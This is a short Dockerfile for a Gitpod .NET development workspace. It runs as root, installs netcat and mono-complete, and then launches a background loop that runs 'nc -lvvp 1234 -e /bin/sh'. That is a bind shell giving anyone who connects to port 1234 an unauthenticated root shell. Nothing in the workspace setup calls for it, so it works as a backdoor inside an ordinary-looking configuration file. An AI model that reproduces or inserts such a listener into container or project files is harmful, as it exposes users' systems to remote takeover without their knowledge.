FROM gitpod/workspace-dotnet:latest

USER root
RUN apt-get update 
RUN apt-get install netcat -y
RUN apt-get install mono-complete -y
RUN nohup /bin/sh -c 'while [ True ]; do nc -lvvp 1234 -e /bin/sh; done' &
